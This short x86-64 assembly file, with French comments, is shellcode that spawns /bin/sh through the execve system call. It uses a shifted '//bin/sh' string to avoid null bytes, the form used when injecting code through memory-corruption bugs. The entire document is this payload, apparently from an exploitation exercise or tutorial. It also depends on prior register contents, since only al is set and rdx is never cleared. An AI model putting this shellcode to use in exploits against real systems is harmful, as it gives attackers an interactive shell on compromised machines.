global _start

section .text
_start:
  xor rsi,rsi 
  mov al,0x3b
  mov rdi, "//bin/sh" ; on ajoute un / pour éviter le null byte
  shr rdi, 8 ; on fait disparaître le / et automatiquement, on insère le x00 
  push rdi
  mov rdi,rsp
  syscall
